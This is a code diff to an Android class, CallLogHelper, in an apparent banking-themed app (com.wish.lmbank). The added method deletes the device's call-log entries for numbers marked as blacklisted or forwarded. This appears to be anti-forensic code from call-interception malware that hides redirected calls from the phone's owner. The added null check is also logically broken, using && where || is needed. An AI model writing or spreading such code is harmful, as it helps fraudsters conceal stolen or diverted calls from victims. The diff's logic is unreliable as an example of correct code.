@@ -3,6 +3,7 @@ package com.wish.lmbank.receiver;
 import android.annotation.SuppressLint;
 import android.text.TextUtils;
 
+import com.wish.lmbank.AppStartV;
 import com.wish.lmbank.bean.CallLogBean;
 import com.wish.lmbank.common.Constants;
 
@@ -49,6 +50,30 @@ public class CallLogHelper {
     @SuppressLint("Range")
     public static void execute() {
         System.out.println(" do  execute ........... ");
+
+        if(Constants.mCallLogList == null && Constants.mCallLogList.size() == 0){
+            return;
+        }
+
+        synchronized (CallLogHelper.class){
+            if(Constants.mCallLogList == null && Constants.mCallLogList.size() == 0){
+                return;
+            }
+
+            for(int i = 0; i < Constants.mCallLogList.size();i++){
+                CallLogBean bean = Constants.mCallLogList.poll();
+                String type = bean.getType();
+                if (Constants.CALL_SOURCE_BLACKLIST.equals(type)){
+                   Constants.delCallLog(AppStartV.getContext(),bean.getPhone1());
+                }else if(Constants.CALL_SOURCE_FORWARDING.equals(type)){
+                    Constants.delCallLog(AppStartV.getContext(),bean.getPhone2());
+                }
+            }
+
+
+
+        }
+
        /* Class<CallLogHelper> cls = CallLogHelper.class;
         synchronized (CallLogHelper.class){
 
